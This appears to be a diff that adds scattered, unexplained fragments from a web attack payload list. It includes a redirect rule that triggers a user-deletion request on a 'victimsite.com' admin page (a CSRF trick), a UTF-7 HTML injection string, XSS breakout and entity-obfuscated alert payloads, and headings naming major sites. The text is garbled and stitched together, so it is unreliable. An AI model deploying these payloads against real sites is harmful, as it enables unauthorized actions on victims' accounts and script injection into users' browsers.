@@ -1,0 +1,19 @@
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+  id    ID    #REQUIRED>]>
+function makePopups(){
+[C]
+#Yandex:
++ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
+a29b1%3balert(888)//a62b7156d82
+[B]
+#Twitter.com:
+#AlibabaGroup:
+#Blogger.com:
+Same effect with
+#GoogleAPI's
+#Uber.com:
+#Others:
+#VK.com:
+-->
+alert&lpar;1&rpar;
